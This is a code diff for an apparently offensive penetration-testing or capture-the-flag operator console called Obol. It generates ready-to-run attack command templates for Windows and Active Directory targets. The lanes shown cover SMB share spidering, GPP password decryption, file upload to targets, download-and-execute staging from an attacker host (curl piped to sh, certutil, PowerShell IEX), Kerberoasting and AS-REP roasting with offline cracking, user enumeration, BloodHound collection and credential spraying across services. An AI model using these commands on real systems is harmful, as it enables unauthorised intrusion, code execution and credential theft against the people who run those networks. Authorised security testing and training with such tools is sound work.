+    var stageSmbPath = isAdmin ? activeStageTool.smbDst : activeStageTool.id;
+
+    var sharesLanes = [
+      pcMakeLane({
+        id: 'shares-custom-gpp',
+        actionId: 'smb-share-inventory',
+        title: 'Recursive Share Listing & GPP XML Decrypt',
+        sub: customShares.length ? ('Walks discovered share (' + chosenShare + ') that nxc -M gpp_password skips') : 'Walks readable shares for Group Policy XML & config files',
+        locked: !(hasSmb && (hasReadableShare || hasCred)),
+        lockReason: !hasPortScan && !hasSmb ? 'Run Nmap Scan First' : (!hasSmb ? 'Port 445 Closed' : 'Enumerate Shares or Add Cred First'),
+        lockBadge: !hasPortScan && !hasSmb ? 'Needs Scan' : (!hasSmb ? 'Port 445 Off' : 'Needs Share'),
+        done: hasGppCpass && hasCred,
+        steps: [
+          {
+            id: 'list-share-recurse',
+            label: 'Recursive List (' + chosenShare + ')',
+            tool: 'smbclient',
+            locus: 'remote',
+            done: hasGppXml || hasGppCpass,
+            note: 'Lists all nested directories and XML/config files on //' + target + '/' + chosenShare + '.',
+            variants: [
+              { id: 'smbclient-recurse', label: 'smbclient recurse; ls', tool: 'smbclient', locus: 'remote', command: "smbclient " + smbAuthFlag + " //" + target + "/" + chosenShare + " -c 'recurse; ls'" },
+              { id: 'nxc-spider', label: 'nxc -M spider_plus', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + (hasCred ? nxcAuth : "-u '' -p ''") + " -M spider_plus" },
+              { id: 'smbmap-recurse', label: 'smbmap -R', tool: 'smbmap', locus: 'remote', command: "smbmap -H " + target + " " + (hasCred ? smbmapAuth : "-u '' -p ''") + " -R " + chosenShare + " --depth 5" }
+            ]
+          },
+          {
+            id: 'pull-decrypt-gpp',
+            label: 'Download *Groups.xml & Decrypt cpassword',
+            tool: 'smbclient',
+            locus: 'remote',
+            done: hasGppCpass && hasCred,
+            note: 'Bulk-downloads Groups.xml / Services.xml from any share and extracts cpassword (paste the output into Obol to auto-decrypt).',
+            variants: [
+              { id: 'smbclient-mget', label: 'smbclient + grep/decrypt', tool: 'smbclient', locus: 'remote', command: "smbclient " + smbAuthFlag + " //" + target + "/" + chosenShare + " -c 'prompt OFF; recurse ON; mget *Groups.xml *Services.xml *ScheduledTasks.xml *DataSources.xml' && grep -rn 'cpassword' ." + (hasGppCpass && gppCpassVal.indexOf('{{') < 0 ? (" && gpp-decrypt '" + gppCpassVal + "'") : "") },
+              { id: 'impacket-gpp', label: 'GetGPPPasswords', tool: 'impacket-GetGPPPasswords', locus: 'remote', command: "impacket-GetGPPPasswords " + (hasCred ? ("'" + impacketIdent + "'" + impacketAuthFlags) : "-no-pass") + " " + target }
+            ]
+          }
+        ]
+      }, deckVariantSel),
+
+      pcMakeLane({
+        id: 'shares-file-pull',
+        actionId: 'smb-share-inventory',
+        title: 'Download / Upload Files Over SMB',
+        sub: 'Port 445 · Share: ' + activeSmbShare + ' · Live Download (GET) & Upload (PUT)',
+        locked: !(hasSmb && (hasReadableShare || hasCred)),
+        lockReason: !hasPortScan && !hasSmb ? 'Run Nmap Scan First' : (!hasSmb ? 'Port 445 Closed' : 'Enumerate Shares or Add Cred First'),
+        lockBadge: !hasPortScan && !hasSmb ? 'Needs Scan' : (!hasSmb ? 'Port 445 Off' : 'Needs Share'),
+        done: false,
+        steps: [
+          {
+            id: 'smb-transfer-step',
+            label: 'SMB Transfer (' + activeSmbShare + ')',
+            tool: 'smbclient',
+            locus: 'remote',
+            done: false,
+            variantLabel: 'Mode:',
+            note: 'Pick a Share or Quick File preset below, or type any Remote / Local path - the counterpart filename auto-fills and commands update live.',
+            paramGroups: [
+              {
+                key: 'smb_share',
+                label: 'Share:',
+                active: activeSmbShare,
+                options: shareChoices.map(function (s) { return { id: s, label: s }; })
+              },
+              {
+                key: 'smb_preset',
+                label: 'Quick File:',
+                active: deckParams.smb_preset || '',
+                options: smbPresets.map(function (p) {
+                  return { id: p.id, label: p.label, sub: p.share, setParams: { smb_preset: p.id, smb_share: p.share, remote_file: p.remote, local_file: p.local } };
+                })
+              }
+            ],
+            fillInputs: [
+              { key: 'remote_file', label: 'Remote Path on Share', value: rawRemoteFile, placeholder: effRemoteFile },
+              { key: 'local_file', label: 'Local Kali Filename', value: rawLocalFile, placeholder: effLocalFile }
+            ],
+            variants: [
+              { id: 'smbclient-get', label: 'GET (smbclient)', tool: 'smbclient', locus: 'remote', command: "smbclient " + smbAuthFlag + " //" + target + "/" + activeSmbShare + " -c 'get \"" + effRemoteFile + "\" \"" + effLocalFile + "\"'" },
+              { id: 'smbclient-put', label: 'PUT (smbclient)', tool: 'smbclient', locus: 'remote', command: "smbclient " + smbAuthFlag + " //" + target + "/" + activeSmbShare + " -c 'put \"" + effLocalFile + "\" \"" + effRemoteFile + "\"'" },
+              { id: 'nxc-get', label: 'GET (nxc)', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --share '" + activeSmbShare + "' --get-file '" + effRemoteFile + "' '" + effLocalFile + "'" },
+              { id: 'nxc-put', label: 'PUT (nxc)', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --share '" + activeSmbShare + "' --put-file '" + effLocalFile + "' '" + effRemoteFile + "'" }
+            ]
+          }
+        ]
+      }, deckVariantSel),
+
+      pcMakeLane({
+        id: 'shares-stage-tools',
+        actionId: isLinuxOnly ? 'linux-enum' : 'windows-enum',
+        title: 'Stage Tools from Kali (' + activeStageTool.label + ' + 12 More)',
+        sub: 'Select any payload below -> Kali HTTP Server + Target Pull / SMB Push',
+        locked: !(hasShell || (isAdmin && (hasSmb || hasWinrm)) || hasFact('smb.writable_share')),
+        lockReason: !hasPortScan && !hasShell ? 'Run Nmap Scan First' : 'Requires Target Shell or Admin Exec',
+        lockBadge: !hasPortScan && !hasShell ? 'Needs Scan' : 'Needs Shell',
+        done: false,
+        steps: [
+          {
+            id: 'stage-http-server',
+            label: 'Stage ' + activeStageTool.label + ' on Kali',
+            tool: 'python3',
+            locus: 'remote',
+            done: false,
+            note: 'Copies ' + activeStageTool.label + ' (' + activeStageTool.role + ') into your current directory and serves it on port 8000.',
+            paramGroups: [
+              {
+                key: 'stage_tool',
+                label: 'Stage Tool:',
+                active: activeStageTool.id,
+                options: STAGE_CATALOG.map(function (t) {
+                  return { id: t.id, label: t.label, sub: t.role };
+                })
+              }
+            ],
+            variants: [
+              { id: 'http-prep', label: 'cp + http.server', tool: 'python3', locus: 'remote', command: "cp -f " + activeStageTool.kaliSrc + " ./" + activeStageTool.id + " 2>/dev/null; python3 -m http.server 8000" },
+              { id: 'http-simple', label: 'http.server only', tool: 'python3', locus: 'remote', command: "python3 -m http.server 8000" },
+              { id: 'smbserver', label: 'smbserver', tool: 'impacket-smbserver', locus: 'remote', command: "impacket-smbserver share . -smb2support" }
+            ]
+          },
+          {
+            id: 'stage-pull-target',
+            label: 'Pull & Run ' + activeStageTool.label,
+            tool: activeStageTool.os === 'lin' ? 'curl' : 'certutil',
+            locus: 'onhost',
+            done: false,
+            variantLabel: 'Via:',
+            note: 'Downloads ' + activeStageTool.label + ' from http://' + lhost + ':8000/' + activeStageTool.id + ' (or pushes via SMB) and runs it.',
+            variants: activeStageTool.os === 'lin' ? [
+              { id: 'curl-lin', label: 'curl -> /tmp', tool: 'curl', locus: 'onhost', command: "curl -sL http://" + lhost + ":8000/" + activeStageTool.id + " -o " + activeStageTool.dst + " && " + activeStageTool.run },
+              { id: 'wget-lin', label: 'wget -> /tmp', tool: 'wget', locus: 'onhost', command: "wget -q http://" + lhost + ":8000/" + activeStageTool.id + " -O " + activeStageTool.dst + " && " + activeStageTool.run },
+              { id: 'curl-pipe', label: 'curl | sh', tool: 'curl', locus: 'onhost', command: "curl -sL http://" + lhost + ":8000/" + activeStageTool.id + " | sh" }
+            ] : [
+              { id: 'certutil-win', label: 'certutil', tool: 'certutil', locus: 'onhost', command: "certutil -urlcache -split -f http://" + lhost + ":8000/" + activeStageTool.id + " " + activeStageTool.dst + " && " + activeStageTool.run },
+              { id: 'iwr-win', label: 'iwr (PS)', tool: 'powershell', locus: 'onhost', command: "iwr -UseBasicParsing -Uri http://" + lhost + ":8000/" + activeStageTool.id + " -OutFile " + activeStageTool.dst + "; " + activeStageTool.run },
+              { id: 'iex-win', label: 'IEX (Mem)', tool: 'powershell', locus: 'onhost', command: "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://" + lhost + ":8000/" + activeStageTool.id + "')\"" },
+              { id: 'smbclient-put-stage', label: 'smbclient put', tool: 'smbclient', locus: 'remote', command: "smbclient " + smbAuthFlag + " //" + target + "/" + stageSmbShare + " -c 'put \"" + activeStageTool.id + "\" \"" + stageSmbPath + "\"'" },
+              { id: 'nxc-put-stage', label: 'nxc --put-file', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --share '" + stageSmbShare + "' --put-file '" + activeStageTool.id + "' '" + stageSmbPath + "'" }
+            ]
+          }
+        ]
+      }, deckVariantSel)
+    ];
+
+    // Tab 5: Cred & AD Ops
+    var credopsLanes = [
+      pcMakeLane({
+        id: 'credops-kerberoast',
+        actionId: 'crack-tgs',
+        title: 'Kerberoasting (Request SPN Tickets -> Offline Crack)',
+        sub: hasTgsHash
+          ? (tgsCracked ? 'TGS hash captured & cracked into cleartext' : 'TGS hash captured (' + (tgsUsers.join(', ') || 'SPN') + ') -> Ready to crack offline')
+          : 'Port 88 / 389 · Authenticated domain user (' + activeUser + ') can request SPN tickets',
+        locked: !(hasCred && isDc),
+        lockReason: !isDc ? 'Requires AD Domain Controller (Port 88 / 389)' : 'Requires Domain Credential',
+        done: hasTgsHash && tgsCracked,
+        steps: [
+          {
+            id: 'kerberoast-request',
+            label: 'Request Kerberoast (TGS) Hashes',
+            tool: 'impacket-GetUserSPNs',
+            locus: 'remote',
+            done: hasTgsHash,
+            note: 'Queries LDAP for accounts with servicePrincipalName set and requests RC4/AES TGS tickets. Paste the $krb5tgs$ output back into Obol.',
+            variants: [
+              { id: 'getuserspns', label: 'GetUserSPNs', tool: 'impacket-GetUserSPNs', locus: 'remote', command: "impacket-GetUserSPNs '" + impacketIdent + "'" + impacketAuthFlags + " -dc-ip " + target + " -request -outputfile kerberoast.tgs" },
+              { id: 'nxc-kerberoast', label: 'nxc --kerberoasting', tool: 'nxc', locus: 'remote', command: "nxc ldap " + target + " " + nxcBaseAuth + " --kerberoasting kerberoast.tgs" },
+              { id: 'bloodyad-kerberoast', label: 'bloodyAD SPNs', tool: 'bloodyAD', locus: 'remote', command: "bloodyAD " + bloodyAuth + " get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName,servicePrincipalName" }
+            ]
+          },
+          {
+            id: 'kerberoast-crack',
+            label: 'Crack Kerberoast Ticket Offline',
+            tool: 'hashcat',
+            locus: 'remote',
+            done: tgsCracked,
+            needsPrevStepPaste: !hasTgsHash,
+            note: hasTgsHash
+              ? 'TGS ticket captured! Run Hashcat or John against rockyou.txt and paste the cracked line back into Obol.'
+              : 'Waiting on Step 1: Run Step 1 and paste a $krb5tgs$ hash first before cracking.',
+            variants: [
+              { id: 'hashcat-13100', label: 'hashcat -m 13100', tool: 'hashcat', locus: 'remote', command: "hashcat -m 13100 kerberoast.tgs /usr/share/wordlists/rockyou.txt --force" },
+              { id: 'john-tgs', label: 'john --format=krb5tgs', tool: 'john', locus: 'remote', command: "john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.tgs" }
+            ]
+          }
+        ]
+      }, deckVariantSel),
+
+      pcMakeLane({
+        id: 'credops-asreproast',
+        actionId: 'crack-asrep',
+        title: 'AS-REP Roasting (Request Pre-Auth Hashes -> Crack)',
+        sub: hasAsrepHash
+          ? (asrepCracked ? 'AS-REP hash captured & cracked' : 'AS-REP hash captured (' + (asrepUsers.join(', ') || 'account') + ') -> Ready to crack offline')
+          : (hasCred ? 'Port 88 · Authenticated LDAP query for DONT_REQ_PREAUTH accounts' : 'Port 88 · Checks discovered usernames for DONT_REQ_PREAUTH'),
+        locked: !isDc || !(hasCred || hasUserList),
+        lockReason: !isDc ? 'Requires AD Domain Controller (Port 88 / 389)' : 'Requires Domain Credential or Discovered User List (users.txt)',
+        done: hasAsrepHash && asrepCracked,
+        steps: [
+          {
+            id: 'asrep-request',
+            label: 'Request AS-REP Hashes',
+            tool: 'impacket-GetNPUsers',
+            locus: 'remote',
+            done: hasAsrepHash,
+            note: hasCred
+              ? 'Uses your domain credential to query LDAP for UF_DONT_REQUIRE_PREAUTH accounts and extract $krb5asrep$ hashes.'
+              : 'Tests discovered usernames in users.txt for Kerberos pre-authentication disabled.',
+            variants: [
+              { id: 'getnpusers', label: 'GetNPUsers', tool: 'impacket-GetNPUsers', locus: 'remote', command: hasCred ? ("impacket-GetNPUsers '" + impacketIdent + "'" + impacketAuthFlags + " -dc-ip " + target + " -request -format hashcat -outputfile asrep.hashes") : ("impacket-GetNPUsers " + (domain || '{{domain}}') + "/ -dc-ip " + target + " -usersfile users.txt -format hashcat -outputfile asrep.hashes") },
+              { id: 'nxc-asrep', label: 'nxc --asreproast', tool: 'nxc', locus: 'remote', command: "nxc ldap " + target + " " + (hasCred ? nxcAuth : "-u users.txt -p ''") + " --asreproast asrep.hashes" }
+            ]
+          },
+          {
+            id: 'asrep-crack',
+            label: 'Crack AS-REP Hash Offline',
+            tool: 'hashcat',
+            locus: 'remote',
+            done: asrepCracked,
+            needsPrevStepPaste: !hasAsrepHash,
+            note: hasAsrepHash
+              ? 'AS-REP hash captured! Crack $krb5asrep$23$ offline with Hashcat or John and paste the result.'
+              : 'Waiting on Step 1: Only run this if Step 1 returns a $krb5asrep$ hash.',
+            variants: [
+              { id: 'hashcat-18200', label: 'hashcat -m 18200', tool: 'hashcat', locus: 'remote', command: "hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt --force" },
+              { id: 'john-asrep', label: 'john --format=krb5asrep', tool: 'john', locus: 'remote', command: "john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.hashes" }
+            ]
+          }
+        ]
+      }, deckVariantSel),
+
+      pcMakeLane({
+        id: 'credops-ldap-enum',
+        actionId: 'ad-enum',
+        title: 'AD User, Group & SPN Enumeration (RID Brute / LDAP)',
+        sub: hasUserList ? 'Domain user list enumerated in Loot' : 'Builds users.txt & discovers service accounts over SMB / LDAP',
+        locked: !((isDc || hasSmb) && (hasCred || hasReadableShare || hasFact('smb.null_session') || hasFact('ad.anonymous_bind') || hasUserList)),
+        lockReason: !(isDc || hasSmb) ? (!hasPortScan ? 'Run Nmap Scan First' : 'Requires SMB (445) or LDAP (389)') : 'Requires Anonymous Session or Credential',
+        lockBadge: !(isDc || hasSmb) ? (!hasPortScan ? 'Needs Scan' : 'Port 445 Off') : 'Needs Session',
+        done: hasUserList,
+        steps: [
+          {
+            id: 'ldap-user-enum-step',
+            label: 'Enumerate Domain Users',
+            tool: 'nxc',
+            locus: 'remote',
+            done: hasUserList,
+            note: 'Enumerates valid domain accounts (for AS-REP roasting / spraying) and checks user description fields for leaked passwords.',
+            variants: [
+              { id: 'nxc-rid-brute', label: 'nxc smb --rid-brute', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + (hasCred ? nxcAuth : "-u '' -p ''") + " --rid-brute" },
+              { id: 'nxc-ldap-users', label: 'nxc ldap --users', tool: 'nxc', locus: 'remote', command: "nxc ldap " + target + " " + (hasCred ? nxcAuth : "-u '' -p ''") + " --users" },
+              { id: 'nxc-pass-pol', label: 'nxc smb --pass-pol', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + (hasCred ? nxcAuth : "-u '' -p ''") + " --pass-pol" }
+            ]
+          }
+        ]
+      }, deckVariantSel),
+
+      pcMakeLane({
+        id: 'credops-acl-bh',
+        actionId: 'bloodhound-collect',
+        title: 'AD ACL Audit & BloodHound Collection',
+        sub: hasAclLead ? 'Outbound ACL / BloodHound path discovered' : 'Finds GenericAll / WriteDacl / ForceChangePassword edges',
+        locked: !(hasCred && isDc),
+        lockReason: !isDc ? 'Requires AD Domain Controller (Port 88 / 389)' : 'Requires Domain Credential',
+        done: hasAclLead || hasBhCollected,
+        steps: [
+          {
+            id: 'acl-bh-collect',
+            label: 'Audit ACLs / Collect BloodHound',
+            tool: 'bloodyAD',
+            locus: 'remote',
+            done: hasAclLead || hasBhCollected,
+            note: 'Finds outbound ACL permissions held by ' + activeUser + ' or collects the full BloodHound graph.',
+            variants: [
+              { id: 'bloodyad-writable', label: 'bloodyAD writable', tool: 'bloodyAD', locus: 'remote', command: "bloodyAD " + bloodyAuth + " get writable" },
+              { id: 'bh-python', label: 'bloodhound-py', tool: 'bloodhound-python', locus: 'remote', command: "bloodhound-python -d " + (domain || '{{domain}}') + " -u '" + activeUser + "' " + (useHashAuth ? ("--hashes :" + activeHash) : ("-p '" + (password || '{{password}}') + "'")) + " -ns " + target + " -c All --zip" },
+              { id: 'nxc-bh', label: 'nxc --bloodhound', tool: 'nxc', locus: 'remote', command: "nxc ldap " + target + " " + nxcAuth + " --bloodhound -c All --dns-server " + target }
+            ]
+          }
+        ]
+      }, deckVariantSel),
+
+      pcMakeLane({
+        id: 'credops-validate',
+        actionId: 'lateral-exec',
+        title: 'Validate Credential Across Services (SMB / WinRM / LDAP / MSSQL / SSH / RDP)',
+        sub: 'Tests ' + activeUser + ' reuse & checks for Pwn3d! admin privileges',
+        locked: !(hasCred && (hasPortScan || hasSmb || hasWinrm || hasLdap || hasSsh || hasRdp)),
+        lockReason: !hasCred ? 'Requires Credential' : 'Run Nmap Scan First',
+        done: hasFact('credential.validated') && isAdmin,
+        steps: [
+          {
+            id: 'validate-cred-step',
+            label: 'Validate Credential Across Services',
+            tool: 'nxc',
+            locus: 'remote',
+            done: hasFact('credential.validated'),
+            variantLabel: 'nxc:',
+            note: 'Paste the NetExec output to record validated services, shares, and Pwn3d! admin access (use --local for machine-local accounts).',
+            variants: [
+              { id: 'nxc-smb', label: 'smb --shares', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --shares" },
+              { id: 'nxc-local', label: '--local', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --local-auth" },
+              { id: 'nxc-winrm', label: 'winrm', tool: 'nxc', locus: 'remote', command: "nxc winrm " + target + " " + nxcAuth },
+              { id: 'nxc-ldap', label: 'ldap', tool: 'nxc', locus: 'remote', command: "nxc ldap " + target + " " + nxcAuth },
+              { id: 'nxc-mssql', label: 'mssql', tool: 'nxc', locus: 'remote', command: "nxc mssql " + target + " " + nxcAuth + " -q 'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(\"sysadmin\");'" },
+              { id: 'nxc-ssh', label: 'ssh', tool: 'nxc', locus: 'remote', command: "nxc ssh " + target + " " + nxcAuth },
+              { id: 'nxc-rdp', label: 'rdp', tool: 'nxc', locus: 'remote', command: "nxc rdp " + target + " " + nxcAuth }
+            ]
+          }
+        ]
+      }, deckVariantSel)
+    ];
+
+    var rawTabs = [
+      { id: 'flags', title: 'Flags & Proof', icon: 'flag', lanes: flagLanes },
+      { id: 'shells', title: 'Get On Host', icon: 'terminal', lanes: shellLanes },
+      { id: 'persistence', title: 'Persistence & Accounts', icon: 'key', lanes: persistenceLanes },
+      { id: 'shares', title: 'Shares & File Transfer', icon: 'folder', lanes: sharesLanes },
+      { id: 'credops', title: 'Cred & AD Ops', icon: 'zap', lanes: credopsLanes }
+    ];
+
+    var readyLaneCount = 0;
+    var tabs = rawTabs.map(function (t) {
+      var rCount = (t.lanes || []).filter(function (l) { return l.status === 'ready'; }).length;
+      readyLaneCount += rCount;
+      return {
+        id: t.id,
+        title: t.title,
+        label: t.title,
+        icon: t.icon,
+        readyCount: rCount,
+        lanes: t.lanes
+      };
+    });
+
+    var uiDeckSel = (eng.ui && eng.ui.deckSel) || {};
+    var uiLaneMap = (eng.ui && eng.ui.operatorDeckLane && typeof eng.ui.operatorDeckLane === 'object') ? eng.ui.operatorDeckLane : {};
+    var reqTabId = opts.tabId || (eng.ui && (eng.ui.operatorDeckTab || eng.ui.deckTab)) || uiDeckSel.tabId || '';
+    var reqLaneId = opts.laneId || (reqTabId && uiLaneMap[reqTabId]) || (eng.ui && eng.ui.deckLane) || uiDeckSel.laneId || (reqTabId && uiDeckSel[reqTabId]) || '';
+
+    var selectedTab = tabs.filter(function (t) { return t.id === reqTabId; })[0];
+    if (!selectedTab) {
+      selectedTab = tabs.filter(function (t) { return t.readyCount > 0; })[0] || tabs[0];
+    }
+
+    var selectedLane = (selectedTab.lanes || []).filter(function (l) { return l.id === reqLaneId; })[0];
+    if (!selectedLane && selectedTab.id === 'flags' && needsBothFlagsOnHost) {
+      var bothLane = (selectedTab.lanes || []).filter(function (l) { return l.id === 'both-flags-onhost' && l.status === 'ready'; })[0];
+      if (bothLane) selectedLane = bothLane;
+    }
+    if (!selectedLane) {
+      selectedLane = (selectedTab.lanes || []).filter(function (l) { return l.status === 'ready' && !l.done; })[0]
+        || (selectedTab.lanes || []).filter(function (l) { return l.status === 'ready'; })[0]
+        || (selectedTab.lanes || [])[0] || null;
+    }
+
+    return {
+      unlocked: unlocked,
+      readyLaneCount: readyLaneCount,
+      activeIdentity: activeIdentity,
+      needsBothFlagsOnHost: !!needsBothFlagsOnHost,
+      localFlagCapturedRemotely: !!localFlagCapturedRemotely,
+      tabs: tabs,
+      selectedTab: selectedTab,
+      selectedLane: selectedLane,
+      selectedTabId: selectedTab ? selectedTab.id : '',
+      selectedLaneId: selectedLane ? selectedLane.id : ''
+    };
+  }
+
+  OBOL.pathChooser = {
+    IDS: PATH_CHOOSER_IDS,
+    ACTION_TO_DECK: ACTION_TO_DECK,
+    has: hasPathChooser,
+    build: buildPathChooser,
+    buildDeck: buildDeck,
+    getOperatorDeck: buildDeck
+  };
+
+  OBOL.pack = {
+    DEFAULT_PACK: DEFAULT_PACK,
+    PACK_NAMES: PACK_NAMES,
+    Action: Action,
+    buildDeck: buildDeck,
+    getOperatorDeck: buildDeck,
+    isFlagHuntAction: isFlagHuntAction,
+    isGuidedSequenceMove: isGuidedSequenceMove,
+    deriveLocus: deriveLocus,
+    deriveScope: deriveScope,
+    locusRank: locusRank,
+    commandLocus: commandLocus,
+    commandExecutionLocus: commandExecutionLocus,
+    commandIsOnHost: commandIsOnHost,
+    moveCommandLoci: moveCommandLoci,
+    defaultCommandLocus: defaultCommandLocus,
+    STAGED_ONHOST_TOOLS: STAGED_ONHOST_TOOLS,
+    requiredStagedTool: requiredStagedTool,
+    isToolStagedOnHost: isToolStagedOnHost,
+    credentialProbeAllowed: credentialProbeAllowed,
+    commandTool: commandTool,
+    commandToolkitRank: commandToolkitRank,
+    isSwitchlessProbe: isSwitchlessProbe,
+    commandSettled: commandSettled,
+    commandIsEligible: commandIsEligible,
+    preferredCommandIndex: preferredCommandIndex,
+    moveToolkitRank: moveToolkitRank,
+    friendly: friendly,
+    chipLabel: chipLabel,
+    FRIENDLY: FRIENDLY,
+    opensUpNext: opensUpNext,
+    hostOsFamily: hostOsFamily,
+    osCompatible: osCompatible,
+    normalizeOsName: normalizeOsName,
+    actionsFromPackData: actionsFromPackData,
+    loadPacks: loadPacks,
+    nextActions: nextActions,
+    nextActionsV2: nextActionsV2,
+    rankActions: rankActions,
+    isReportOnly: isReportOnly,
+    // Shared fact-classification - the move linter (tools/move-lint.js) uses the SAME predicates the
+    // ranker does, so a move that passes the lint is, by construction, one the ranker places sanely.
+    GOALS: V2_GOALS,
+    GOALS_NO_FLAGS: V2_GOALS_NO_FLAGS,
+    isEvidenceFact: v2EvidenceFact,
+    producesFoothold: v2ProducesFoothold,
+    producesPrivilege: function (a) { for (var i = 0; i < a.produces.length; i++) if (V2_PRIV[a.produces[i]]) return true; return false; },
+    isIndicated: v2Indicated,
+    v2Earned: v2Earned,
+    planPath: planPath,
+    ranker: 'v2',
+    lockedActions: lockedActions,
+    blockedActions: blockedActions,
+    accessEpoch: accessEpoch,
+  };
+})(typeof globalThis !== 'undefined' ? globalThis : this);
